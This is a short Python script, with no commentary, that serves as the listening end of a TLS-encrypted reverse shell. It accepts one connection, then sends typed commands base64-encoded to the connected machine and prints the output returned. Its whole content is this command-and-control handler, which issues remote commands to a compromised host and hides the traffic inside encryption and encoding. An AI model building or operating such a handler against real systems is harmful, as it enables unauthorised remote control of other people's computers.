import socket, base64, ssl

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind (('127.0.0.1', 4443))

#wrap with ssl
s = ssl.wrap_socket(s, keyfile='serverkey.key', certfile='servercert.cert', server_side=True, ssl_version=ssl.PROTOCOL_TLSv1_2, ciphers='AES256')

s.listen(1)
print('listening for connections')
conn, addr = s.accept()
print('recieved connection from ' + str(addr))
while 1:
    command = input(": ").encode('utf-8')
    encoded = base64.b64encode(command)
    conn.send(encoded)
    cmdoutput = conn.recv(2048)
    decoded = base64.b64decode(cmdoutput)
    print(decoded.decode('utf-8'))
conn.close()
s.close()
